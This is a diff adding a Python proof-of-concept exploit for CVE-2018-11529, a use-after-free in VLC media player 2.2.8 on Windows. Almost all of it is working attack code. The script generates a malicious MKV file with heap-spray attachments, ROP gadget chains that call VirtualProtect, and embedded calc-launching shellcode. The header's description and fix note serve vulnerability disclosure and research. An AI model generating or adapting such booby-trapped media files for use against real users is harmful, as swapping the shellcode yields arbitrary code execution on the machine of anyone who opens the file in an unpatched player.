@@ -1,0 +1,297 @@
+# Exploit Title: VLC media player 2.2.8 - Arbitrary Code Execution PoC
+# Date: 2018-06-06
+# Exploit Author: Eugene Ng
+# Vendor Homepage: https://www.videolan.org/vlc/index.html
+# Software Link: http://download.videolan.org/pub/videolan/vlc/2.2.8/win64/vlc-2.2.8-win64.exe
+# Version: 2.2.8
+# Tested on: Windows 10 x64
+# CVE: CVE-2018-11529
+#
+# 1. Description
+#
+# VLC media player through 2.2.8 is prone to a Use-After-Free (UAF) vulnerability. This issue allows 
+# an attacker to execute arbitrary code in the context of the logged-in user via crafted MKV files. Failed
+# exploit attempts will likely result in denial of service conditions.
+#
+# Exploit can work on both 32 bits and 64 bits of VLC media player.
+#
+# 2. Proof of Concept
+#
+# Generate MKV files using python
+# Open VLC media player
+# Drag and drop poc.mkv into VLC media player (more reliable than double clicking)
+#
+# 3. Solution
+#
+# Update to version 3.0.3
+# https://get.videolan.org/vlc/3.0.3/win64/vlc-3.0.3-win64.exe
+
+import uuid
+from struct import pack
+
+class AttachedFile(object):
+    def __init__(self, data):
+        self.uid    = '\x46\xae' + data_size(8) + uuid.uuid4().bytes[:8]
+        self.name   = '\x46\x6e' + data_size(8) + uuid.uuid4().bytes[:8]
+        self.mime   = '\x46\x60' + data_size(24) + 'application/octet-stream'
+        self.data   = '\x46\x5c' + data_size(len(data)) + data
+        self.header = '\x61\xa7' + data_size(len(self.name) + len(self.data) + len(self.mime) + len(self.uid))
+
+    def __str__(self):
+        return self.header + self.name + self.mime + self.uid + self.data
+
+def to_bytes(n, length):
+    h = '%x' % n
+    s = ('0'*(len(h) % 2) + h).zfill(length*2).decode('hex')
+    return s
+
+def data_size(number, numbytes=range(1, 9)):
+    # encode 'number' as an EBML variable-size integer.
+    size = 0
+    for size in numbytes:
+        bits = size*7
+        if number <= (1 << bits) - 2:
+            return to_bytes(((1 << bits) + number), size)
+    raise ValueError("Can't store {} in {} bytes".format(number, size))
+
+def build_data(size, bits, version):
+    target_addresses = {
+        '64': 0x40000040,
+        '32': 0x22000020,
+    }
+    target_address = target_addresses[bits]
+
+    exit_pointers = {
+        '64': {
+            '2.2.8': 0x00412680,
+        },
+        '32': {
+            '2.2.8': 0x00411364,
+        }
+    }
+    pExit = exit_pointers[bits][version]
+
+    rop_gadgets = {
+        '64': {
+            '2.2.8': [
+                0x004037ac,             # XCHG EAX,ESP # ROL BL,90H # CMP WORD PTR [RCX],5A4DH # JE VLC+0X37C0 # XOR EAX,EAX # RET
+                0x00403b60,             # POP RCX # RET
+                target_address,         # lpAddress
+                0x004011c2,             # POP RDX # RET
+                0x00001000,             # dwSize
+                0x0040ab70,             # JMP VirtualProtect
+                target_address + 0x500, # Shellcode
+            ],
+        },
+        '32': {
+            '2.2.8': [
+                0x0040ae91,             # XCHG EAX,ESP # ADD BYTE PTR [ECX],AL # MOV EAX,DWORD PTR [EAX] # RET
+                0x00407086,             # POP EDI # RETN [vlc.exe]
+                0x00000040,             # 0x00000040-> edx
+                0x0040b058,             # MOV EDX,EDI # POP ESI # POP EDI # POP EBP # RETN [vlc.exe]
+                0x41414141,             # Filler (compensate)
+                0x41414141,             # Filler (compensate)
+                0x41414141,             # Filler (compensate)
+                0x004039c7,             # POP EAX # POP ECX # RETN [vlc.exe]
+                0x22000030,             # Filler (compensate) for rol [eax] below
+                0x41414141,             # Filler (compensate)
+                0x004039c8,             # POP ECX # RETN [vlc.exe]
+                0x0041193d,             # &Writable location [vlc.exe]
+                0x00409d18,             # POP EBX # RETN [vlc.exe]
+                0x00000201,             # 0x00000201-> ebx
+                0x0040a623,             # POP EBP # RETN [vlc.exe]
+                0x0040a623,             # POP EBP # RETN [vlc.exe]
+                0x004036CB,             # POP ESI # RETN [vlc.exe]
+                0x0040848c,             # JMP ds:[EAX * 4 + 40e000] [vlc.exe]
+                0x00407086,             # POP EDI # RETN [vlc.exe]
+                0x0040ae95,             # MOV EAX,DWORD PTR [EAX] # RETN [vlc.exe]
+                0x0040af61,             # PUSHAD # ROL BYTE PTR [EAX], 0FFH # LOOPNE VLC+0XAEF8 (0040AEF8)
+                target_address + 0x5e0, # Shellcode
+            ],
+        }
+    }
+
+    if bits == '64':
+        target_address_packed = pack("<Q", target_addresses[bits])
+        rop_chain = ''.join(pack('<Q', _) for _ in rop_gadgets[bits][version])
+
+        # https://github.com/peterferrie/win-exec-calc-shellcode/tree/master/build/bin
+        # w64-exec-calc-shellcode-esp.bin
+        shellcode = (
+        "\x66\x83\xe4\xf0\x50\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48"
+        "\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad"
+        "\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74"
+        "\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02"
+        "\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01"
+        "\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7"
+        # add shellcode to avoid crashes by terminating the process
+        # xor rcx, rcx # mov rax, pExit # call [rax]
+        "\x48\x31\xc9\x48\xc7\xc0" + pack("<I", pExit) + "\xff\x10")
+
+        if size == 0x180:
+            UAF_object = '\x41'
+            while len(UAF_object) < size:
+                UAF_object += UAF_object
+            UAF_object = UAF_object[:size]
+            UAF_object = UAF_object[:0x30] + target_address_packed + UAF_object[0x38:]
+            UAF_object = UAF_object[:0x38] + pack("<Q", target_address + 0x10000) + UAF_object[0x40:]
+            UAF_object = UAF_object[:0x168] + pack("<Q", target_address + 0x3c0) + UAF_object[0x170:]
+            UAF_object = UAF_object[:0x170] + target_address_packed + UAF_object[0x178:]
+            return UAF_object
+        else:
+            block = '\x00'
+            block_size = 0x1000
+            while len(block) < block_size:
+                block += block
+            block = block[:block_size]
+            block = block[:0x0] + '\x41' * 4 + block[0x4:]
+            block = block[:0x8] + target_address_packed + block[0x10:]
+            block = block[:0x10] + target_address_packed + block[0x18:]
+            block = block[:0x40] + pack("<Q", 0x1) + block[0x48:]
+            block = block[:0x58] + pack("<Q", target_address + 0x3a8) + block[0x60:]
+            block = block[:0xE4] + pack("<Q", 0x1) + block[0xEC:]
+            block = block[:0x1b8] + pack("<Q", target_address + 0x80) + block[0x1c0:]
+            block = block[:0x3b8] + rop_chain + block[0x3b8+len(rop_chain):]
+            block = block[:0x500] + shellcode + block[0x500 + len(shellcode):]
+            block = block[:0x6d8] + pack("<Q", target_address + 0x10) + block[0x6e0:]
+            while len(block) < size:
+                block += block
+            return block[:size]
+    else:
+        target_address_packed = pack("<I", target_addresses[bits])
+        rop_chain = ''.join(pack('<I', _) for _ in rop_gadgets[bits][version])
+
+        # https://github.com/peterferrie/win-exec-calc-shellcode/tree/master/build/bin
+        # w32-exec-calc-shellcode.bin
+        shellcode = (
+        "\x83\xE4\xFC\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59\x52\x51\x64"
+        "\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B"
+        "\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F\x24"
+        "\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF0"
+        "\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7"
+        # add shellcode to avoid crashes by terminating the process
+        # xor eax, eax # push eax # mov eax, pExit # jmp eax
+        "\x31\xC0\x50\xA1" + pack("<I", pExit) + "\xff\xe0")
+
+        if size == 0x100:
+            UAF_object = '\x41'
+            while len(UAF_object) < size:
+                UAF_object += UAF_object
+            UAF_object = UAF_object[:size]
+            UAF_object = UAF_object[:0x28] + target_address_packed + UAF_object[0x2c:]
+            UAF_object = UAF_object[:0x2c] + pack("<I", target_address + 0x10000) + UAF_object[0x30:]
+            UAF_object = UAF_object[:0xf4] + pack("<I", target_address + 0x2bc) + UAF_object[0xf8:]
+            UAF_object = UAF_object[:0xf8] + target_address_packed + UAF_object[0xfc:]
+            return UAF_object
+        else:
+            block = '\x00'
+            block_size = 0x1000
+            while len(block) < block_size:
+                block += block
+            block = block[:block_size]
+            block = block[:0x0] + pack("<I", 0x22000040) + block[0x4:]
+            block = block[:0x4] + target_address_packed + block[0x8:]
+            block = block[:0x8] + target_address_packed + block[0xc:]
+            block = block[:0x10] + pack("<I", 0xc85) + block[0x14:]
+            block = block[:0x30] + pack("<I", 0x1) + block[0x34:]
+            block = block[:0xc0] + pack("<I", 0x1) + block[0xc4:]
+            block = block[:0x194] + pack("<I", 0x2200031c) + block[0x198:]
+            block = block[:0x2c0] + pack("<I", 0x220002e4) + block[0x2c4:]
+            block = block[:0x2f4] + pack("<I", 0x22000310) + block[0x2f8:]
+            block = block[:0x2f8] + rop_chain + block[0x2f8+len(rop_chain):]
+            block = block[:0x564] + pack("<I", 0x22000588) + block[0x568:]
+            block = block[:0x5e0] + shellcode + block[0x5e0+len(shellcode):]
+            while len(block) < size:
+                block += block
+            return block[:size]
+
+def build_exploit(bits, version):
+    # EBML Header
+    DocType = "\x42\x82" + data_size(8) + "matroska"
+    EBML = "\x1a\x45\xdf\xa3" + data_size(len(DocType)) + DocType
+
+    # Seek Entries
+    SeekEntry = "\x53\xab" + data_size(4)                             # SeekID
+    SeekEntry += "\x15\x49\xa9\x66"                                   # KaxInfo
+    SeekEntry += "\x53\xac" + data_size(2) + "\xff" * 2               # SeekPosition + Index of Segment info
+    SeekEntries = "\x4d\xbb" + data_size(len(SeekEntry)) + SeekEntry  # Seek Entry
+
+    SeekEntry = "\x53\xab" + data_size(4)                             # SeekID
+    SeekEntry += "\x11\x4d\x9b\x74"                                   # KaxSeekHead
+    SeekEntry += "\x53\xac" + data_size(4) + "\xff" * 4               # SeekPosition + Index of SeekHead
+    SeekEntries += "\x4d\xbb" + data_size(len(SeekEntry)) + SeekEntry # Seek Entry
+
+    SeekEntry = "\x53\xab" + data_size(4)                             # SeekID
+    SeekEntry += "\x10\x43\xa7\x70"                                   # KaxChapters
+    SeekEntry += "\x53\xac" + data_size(4) + "\xff" * 4               # SeekPosition + Index of Chapters
+    SeekEntries += "\x4d\xbb" + data_size(len(SeekEntry)) + SeekEntry # Seek Entry
+
+    # SeekHead
+    SeekHead = "\x11\x4d\x9b\x74" + data_size(len(SeekEntries)) + SeekEntries
+
+    # Void
+    Void = "\xec" + data_size(2) + "\x41" # Trigger bug with an out-of-order element
+
+    # Info
+    SegmentUID = "\x73\xa4" + data_size(16) + uuid.uuid4().bytes
+    Info = "\x15\x49\xa9\x66" + data_size(len(SegmentUID)) + SegmentUID
+
+    # Chapters
+    ChapterSegmentUID = "\x6e\x67" + data_size(16) + uuid.uuid4().bytes
+    ChapterAtom = "\xb6" + data_size(len(ChapterSegmentUID)) + ChapterSegmentUID
+    EditionEntry = "\x45\xb9" + data_size(len(ChapterAtom)) + ChapterAtom
+    Chapters = "\x10\x43\xa7\x70" + data_size(len(EditionEntry)) + EditionEntry
+
+    if bits == '64':
+        size = 0x180
+        count = 60
+    else:
+        size = 0x100
+        count = 30
+
+    # Attachments
+    print "[+] Generating UAF objects...",
+    AttachedFiles = ""
+    for i in range(500):
+        AttachedFiles += str(AttachedFile(build_data(size, bits, version)))
+    Attachments = "\x19\x41\xa4\x69" + data_size(len(AttachedFiles)) + AttachedFiles
+    print "done"
+
+    # Cluster
+    print "[+] Generating payload...",
+    payload = build_data(0xfff000, bits, version)
+    SimpleBlocks = "\xa3" + data_size(len(payload)) + payload
+    SimpleBlocksLength = len(SimpleBlocks) * count
+    Timecode = "\xe7" + data_size(1) + "\x00"
+    Cluster = "\x1f\x43\xb6\x75" + data_size(len(Timecode) + SimpleBlocksLength) + Timecode
+    print "done"
+
+    # Concatenate everything
+    SegmentData = SeekHead + Void + Info + Chapters + Attachments + Cluster
+    Segment = "\x18\x53\x80\x67" + data_size(len(SegmentData) + SimpleBlocksLength) + SegmentData
+    mkv = EBML + Segment
+
+    print "[+] Writing poc MKV...",
+    with open('poc.mkv', 'wb') as fp:
+        fp.write(mkv)
+        for i in range(count):
+            fp.write(SimpleBlocks)
+    print "done"
+
+    # Bug requires another MKV file in the same directory, hence we
+    # generate another 'minimally valid' MKV file that VLC will parse
+    # Also able to use any other valid MKV file...
+    auxi_mkv = mkv[:0x4f] + "\x15\x49\xa9\x66" + data_size(10) # Add some arbitrary size
+
+    print "[+] Writing auxiliary MKV...",
+    with open('auxi.mkv', 'wb') as fp:
+        fp.write(auxi_mkv)
+    print "done"
+
+if __name__ == '__main__':
+    bits = '64' # 32 / 64
+    version = '2.2.8'
+
+    print "Building exploit for %s-bit VLC media player %s on Windows" % (bits, version)
+    build_exploit(bits, version)
+    print "Open VLC and drag and drop in poc.mkv"
